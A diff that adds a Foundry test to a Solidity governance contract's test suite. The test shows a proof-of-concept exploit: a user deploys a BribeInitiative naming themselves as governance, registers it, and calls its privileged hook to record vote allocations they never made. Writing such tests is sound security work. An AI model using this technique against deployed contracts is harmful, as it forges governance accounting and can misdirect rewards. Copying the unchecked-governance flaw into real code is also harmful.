@@ -568,6 +568,58 @@ contract GovernanceTest is Test {
         vm.stopPrank();
     }
 
+    function test_registerInitiative_different_governance() public {
+        vm.startPrank(user);
+
+        address userProxy = governance.deployUserProxy();
+
+        // passes in user address as governance, allowing them to call privileged functions
+        address maliciousInitiative = address(new BribeInitiative(user, address(lusd), address(lqty)));
+
+        vm.startPrank(lusdHolder);
+        lusd.transfer(user, 2e18);
+        vm.stopPrank();
+
+        vm.startPrank(user);
+
+        lusd.approve(address(governance), 2e18);
+
+        lqty.approve(address(userProxy), 1e18);
+        governance.depositLQTY(1e18);
+        vm.warp(block.timestamp + 365 days);
+
+        governance.registerInitiative(maliciousInitiative);
+        uint16 atEpoch = governance.registeredInitiatives(maliciousInitiative);
+        assertEq(atEpoch, governance.epoch());
+
+        // user sets an allocation for themselves on the initiative that doesn't exist
+        IGovernance.UserState memory userState = IGovernance.UserState({
+            allocatedLQTY: uint88(10e18),
+            averageStakingTimestamp: uint32(block.timestamp)
+        });
+
+        IGovernance.Allocation memory allocation = IGovernance.Allocation({
+            voteLQTY: uint88(10e18),
+            vetoLQTY: uint88(0),
+            atEpoch: governance.epoch()
+        });
+
+        IGovernance.InitiativeState memory initiativeState = IGovernance.InitiativeState({
+            voteLQTY: uint88(10e18),
+            vetoLQTY: uint88(0),
+            averageStakingTimestampVoteLQTY: uint32(block.timestamp),
+            averageStakingTimestampVetoLQTY: 0,
+            lastEpochClaim: 0
+        });
+
+        BribeInitiative(maliciousInitiative).onAfterAllocateLQTY(governance.epoch(), user, userState, allocation, initiativeState);
+
+        (uint88 lqtyAllocated, uint32 averageTimestamp) = BribeInitiative(maliciousInitiative).lqtyAllocatedByUserAtEpoch(user, governance.epoch());
+        assertGt(lqtyAllocated, 0, "user accounted for lqty without ever allocating");
+        console2.log("lqtyAllocated: ", lqtyAllocated);
+        vm.stopPrank();
+    }
+
     // TODO: Broken: Fix it by simplifying most likely
     function test_unregisterInitiative() public {
         vm.startPrank(user);
